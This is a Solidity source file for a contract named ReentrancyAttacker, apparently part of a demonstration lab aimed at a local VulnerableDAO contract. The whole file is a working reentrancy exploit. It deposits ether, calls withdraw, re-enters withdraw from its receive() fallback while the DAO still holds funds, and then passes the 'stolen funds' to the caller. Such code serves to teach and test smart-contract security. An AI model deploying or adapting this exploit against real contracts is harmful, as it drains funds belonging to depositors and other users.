// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {VulnerableDAO} from "./VulnerableDAO.sol";

interface IDAO {
    function withdraw() external;
    function deposit() external payable;
    function daoBalance() external view returns (uint256);
}

contract ReentrancyAttacker {
    IDAO public dao;
    uint256 public attackCount;

    event AttackStep(uint256 step, string description);

    constructor(address _dao) {
        dao = IDAO(_dao);
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "ReentrancyAttacker: need at least 1 ether");

        emit AttackStep(1, "Depositing initial ETH to DAO");
        dao.deposit{value: msg.value}();

        emit AttackStep(2, "Initiating first withdraw");
        dao.withdraw();
    }

    receive() external payable {
        attackCount++;
        emit AttackStep(attackCount + 2, string(abi.encodePacked("Reentrancy attack #", _toString(attackCount))));

        // Re-enter the withdraw function while balance is still non-zero
        if (address(dao).balance >= 1 ether) {
            dao.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdrawStolenFunds() public {
        uint256 balance = address(this).balance;
        require(balance > 0, "ReentrancyAttacker: no funds to withdraw");
        (bool sent,) = msg.sender.call{value: balance}("");
        require(sent, "ReentrancyAttacker: failed to send funds");
    }

    function _toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }
}
